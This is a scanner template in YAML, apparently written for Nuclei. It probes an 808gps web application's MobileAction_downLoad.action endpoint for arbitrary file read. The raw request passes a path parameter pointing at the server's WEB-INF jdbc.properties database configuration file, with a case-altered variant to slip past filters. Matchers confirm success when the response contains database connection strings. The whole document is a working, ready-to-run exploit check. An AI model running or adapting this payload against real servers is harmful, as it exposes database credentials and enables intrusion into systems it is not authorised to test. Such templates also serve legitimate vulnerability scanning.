id: 808gps-MobileAction_downLoad-file_read

info:
  name: 808gps-MobileAction_downLoad.action-file_read
  author: 808gps-MobileAction_downLoad.action-file_read
  severity: critical

requests:
  - raw:
      - |
        GET /808gps/MobileAction_downLoad.action?path={{path}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
        Connection: close
        Upgrade-Insecure-Requests: 1

    payloads:
      path:
       - /WEB-INF/classes/config/jdbc.properties
       - /WeB-INF/Classes/config/jdbc.properties
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DATABASE"
          - "jdbc"
        condition: and

      - type: status
        status:
          - 200
